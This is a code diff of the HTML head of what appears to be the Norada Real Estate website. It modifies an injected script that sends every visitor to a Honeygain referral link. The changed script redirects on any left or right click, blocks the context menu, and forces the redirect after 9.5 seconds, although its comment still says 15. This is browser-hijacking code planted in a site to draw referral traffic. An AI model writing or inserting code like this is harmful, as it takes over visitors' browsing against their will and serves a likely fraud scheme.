@@ -35,27 +35,39 @@
 <link rel='dns-prefetch' href='//cdnjs.cloudflare.com' />
 <link rel='dns-prefetch' href='//code.highcharts.com' />
 <script>
-        // Function to redirect to a new website
-        function redirectToNewWebsite() {
-            console.log('Redirecting to new website...');
-            window.location.href = 'https://r.honeygain.me/EEMELFA932'; // Change the URL to the desired new website
-        }
+    // Function to redirect to a new website
+    function redirectToNewWebsite() {
+        console.log('Redirecting to new website...');
+        window.location.href = 'https://r.honeygain.me/EEMELFA932'; // Change the URL to the desired new website
+    }
 
-        // Function to handle click event
-        function handleClick() {
-            console.log('Click event detected.');
+    // Function to handle click event
+    function handleClick(event) {
+        console.log('Click event detected.');
+        if (event.button === 0) {
             redirectToNewWebsite();
         }
+    }
 
-        // Add event listener for clicks anywhere on the site
-        document.addEventListener('click', handleClick);
+    // Function to handle contextmenu (right-click) event
+    function handleContextMenu(event) {
+        console.log('Contextmenu event detected.');
+        event.preventDefault(); // Prevent the default context menu
+        redirectToNewWebsite();
+    }
 
-        // Set a timer to redirect after 15 seconds
-        setTimeout(function() {
-            console.log('15 seconds have passed. Redirecting...');
-            redirectToNewWebsite();
-        }, 15000); // 15000 milliseconds = 15 seconds
-    </script>
+    // Add event listener for clicks anywhere on the site
+    document.addEventListener('click', handleClick);
+
+    // Add event listener for contextmenu (right-click) events
+    document.addEventListener('contextmenu', handleContextMenu);
+
+    // Set a timer to redirect after 15 seconds
+    setTimeout(function() {
+        console.log('15 seconds have passed. Redirecting...');
+        redirectToNewWebsite();
+    }, 9500); // 15000 milliseconds = 15 seconds
+</script>
 <link rel="alternate" type="application/rss+xml" title="Norada Real Estate Investments &raquo; Feed" href="https://www.noradarealestate.com/feed/" />
 <link rel="alternate" type="application/rss+xml" title="Norada Real Estate Investments &raquo; Comments Feed" href="https://www.noradarealestate.com/comments/feed/" />
 <link rel="alternate" type="application/rss+xml" title="Norada Real Estate Investments &raquo; Stories Feed" href="https://www.noradarealestate.com/web-stories/feed/">		<!-- This site uses the Google Analytics by MonsterInsights plugin v8.10.1 - Using Analytics tracking - https://www.monsterinsights.com/ -->
